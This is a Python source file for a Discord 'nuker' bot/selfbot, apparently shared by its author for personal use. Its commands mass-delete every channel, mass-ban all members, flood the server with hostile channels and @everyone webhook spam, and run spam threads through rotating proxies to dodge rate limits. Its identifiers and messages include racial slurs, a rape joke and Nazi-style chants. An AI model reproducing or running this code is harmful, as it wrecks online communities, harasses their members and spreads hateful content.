import os
# Hello, if you came here, I don't know how you find this repl
# But don't fork this project nor skid it, if you do you're a fucking skidlord
# I made it only for myself, I won't accept a useless skid who
# forks my projects and takes credits for my work.

import discord, requests
from discord.ext import commands
import asyncio
import random
import time
import threading
import aiohttp
import proxygen
from itertools import cycle
import replit
from colors import black, blue, red, green, yellow, cyan, reset, magenta, white
import json
import base64

default_token = os.environ['defeault_token']
usertoken = input("Insert your token > ")
if usertoken == "cazzo":
  usertoken = default_token

prefix = "%"

Answers = ["Yes", "ye", "yes", "YeS", "YEs", "YES", "yEs", "yeS", "yeah", "Yeah", "Yep", "yep", "YE", "Ye", "yE", "y", "Y"]

account_type = input("\n%s[!] Warning [!]%s\n%sAre you using an account token?%s %sYes/No%s > " % (yellow(), reset(), magenta(), reset(), green(), reset()))


replit.clear()

if account_type in Answers:
    try:
        slayer = commands.Bot(prefix, self_bot=True)
        headers = {
          "Authorization": usertoken
          }
    except:
      pass
else:
    try:
        intenzioni = input("\n%s[!]%s You have choosen a bot account, do you want the %sintents%s to be %senabled%s? Yes/No > " % (yellow(), reset(), red(), reset(), green(), reset()))
        if intenzioni in Answers:
            intents = discord.Intents().all()
            slayer = commands.Bot(prefix, intents=intents)
            headers = {
                "authorization": f"Bot {usertoken}"
                }
        else:
            slayer = commands.Bot(prefix)
            slayer.remove_command("help")
            headers = {
                "authorization": f"Bot {usertoken}"
                }
    except:
        pass


checkweb = False
proxies = proxygen.get_proxies()
proxy_pool = cycle(proxies)
proxy = next(proxy_pool)

@slayer.event
async def on_ready():
  print("\nSuccesfully connected.")

headers = {
    "Authorization": str(usertoken)
    }

async def deletechannels_worker(queue):
    # Rust told me how to do it, I don't know if it's skidded.
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                channel = queue.get_nowait()
                try:
                    request = await session.delete(f"https://discordapp.com/api/v9/channels/{channel.id}", headers=headers, ssl=False)
                except:
                    pass
                if request.status == 200:
                    print(f"Deleted Channel - {channel}")
                    queue.task_done()
                elif request.status == 429:
                    json = await request.json()
                    print(f"Rape limited")
                    await asyncio.sleep(json['retry_after'])
                    queue.put_nowait(channel)
                elif request.status in [401, 404, 403]:
                    return
                await session.close()
        except Exception as e:
            if isinstance(e, asyncio.QueueEmpty):
                await session.close()
                return
            elif 'Cannot connect to host discordapp.com:443 ssl:default [Name or service not known]' in str(e):
                queue.put_nowait(channel)
            else:
                print(e)


@slayer.command(description="Asyncio Queue Cdel.")
async def q_del(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    queue = asyncio.Queue()
    for channel in ctx.guild.channels:
        queue.put_nowait(channel)
        print(f"Queuing all channels..")
    tasks = []
    for x in range(5):
        task = asyncio.create_task(deletechannels_worker(queue))
        tasks.append(task)
    await queue.join()
    for task in tasks:
        task.cancel()


thechans = []
@slayer.command()
async def cdel(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    guild = ctx.guild
    for channel in guild.channels:
        thechans.append(channel.id)
    await deleteall()

def get_chans(session):
    tasks = []
    for niggurs in thechans:
        try:
            tasks.append(session.delete(f"https://discord.com/api/v9/channels/{niggurs}", headers=headers))
        except:
            pass
    return tasks

async def deleteall():
    async with aiohttp.ClientSession() as session:
        tasks = get_chans(session)
        try:
            await asyncio.gather(*tasks)
        except:
            pass 


@slayer.command()
async def ccr(ctx):
    try:
        await ctx.messagge.delete()
    except:
        pass
    global serwer
    serwer = str(ctx.guild.id)
    threadchan()

def chanflood():
    payload = {
        "name": "heil aos and uag",
        "type": "0"
    }
    try:
        while True:
            r = requests.post(f"https://discord.com/api/v9/guilds/{serwer}/channels", headers=headers, json=payload, proxies={"http": proxy})
    except:
        pass

def threadchan():
    threads = []
    for i in range(8):
        t = threading.Thread(target=chanflood)
        threads.append(t)
        t.start()    


@slayer.event
async def on_guild_channel_create(channel):
  global checkweb
  if checkweb == True:
      webhook = await channel.create_webhook(name="Takaso")
      try:
          while True:
              await webhook.send(content=" > Nuked by **AOS** and **UAG**\n```py\n'Imagine having your surver fucked by Takaso LMAO'\n```\nhttps://www.youtube.com/watch?v=6HERu7qn1xg\n > **HEIL TAKASO**\n@everyone")
      except:
          pass

@slayer.command()
async def idinfo(ctx, *, ID = None):
    # HypeSquad function source: https://stackoverflow.com/questions/66951118/discord-py-showing-user-badges
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == None:
        await ctx.send("I forgot to put the ID.", delete_after=4)
    try:
        user = await slayer.fetch_user(ID)
    except:
        await ctx.send("Invalid ID.", delete_after=5)
    date_format = "%a, %d %b %Y %I:%M %p"
    hypesquad_class = str(user.public_flags.all()).replace('[<UserFlags.', '').replace('>]', '').replace('_',
                                                                                                         ' ').replace(
        ':', '').title()
    hypesquad_class = ''.join([i for i in hypesquad_class if not i.isdigit()])
    em=discord.Embed(title="**〓〓〚Info Card〛〓〓**", description=f"""
**Username**
```
{user.name}#{user.discriminator}
```
**Account Creation**
```
{user.created_at.strftime(date_format)}
```
**HypeSquad**
```
{hypesquad_class}
```
""", color=0xffff00)
    em.set_thumbnail(url=user.avatar_url)
    try:
        await ctx.send(embed=em, delete_after=15)
    except:
        print("\n[%s-%s] Failed to send message!" % (red()), reset())


themembers = []
@slayer.command()
async def massban(ctx):
    global guild2
    try:
        await ctx.message.delete()
    except:
        pass
    guild2 = ctx.guild.id
    guild = ctx.guild
    for members in guild.members:
        try:
            themembers.append(members.id)
            themembers.remove(slayer.user.id)
        except:
            pass
    await banall()

def get_members(session):
    tasks = []
    for server_members in themembers:
        try:
            tasks.append(session.put(f"https://discord.com/api/v9/guilds/{guild2}/bans/{server_members}", headers=headers))
        except:
            pass
    return tasks

async def banall():
    async with aiohttp.ClientSession() as session:
        tasks = get_members(session)
        try:
            await asyncio.gather(*tasks)
        except:
            pass


@slayer.command()
async def spam(ctx, *, args):
    global msg
    global chan
    global stop
    stop = True
    msg = args
    try:
        await ctx.message.delete()
    except:
        pass
    finally:
        chan = ctx.channel.id
    godspam1()

@slayer.command
async def killspam(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    finally:
        global stop
        stop = False


def godspambase():
    global msg
    global chan
    global stop
    payload = {
        "content" : msg
        }
    try:
        while True:
            r = requests.post(f"https://discord.com/api/v9/channels/{chan}/messages", headers=headers, data=payload, proxies={"http": proxy})
            if stop == False:
                break    
    except:
        pass

def godspam1():
    threads = []
    for i in range(5):
        t = threading.Thread(target=godspambase)
        threads.append(t)
        t.start()

if account_type in Answers:
    try:
        slayer.run(usertoken, bot=False)
    except:
        print("\n%s[!] Warning [!]%s" % (blue(), reset()))
        print("\n%sLooks like your token is invalid!%s" % (red(), reset()))
else:
    try:
        slayer.run(usertoken)
    except:
        print("\n%s[!] Warning [!]%s" % (blue(), reset()))
        print("\nLooks like your %stoken%s is %sinvalid!%s" % (yellow(), reset(), red(), reset()))

fail = input("\n%sPress any key to exit%s > " % (red(), reset()))
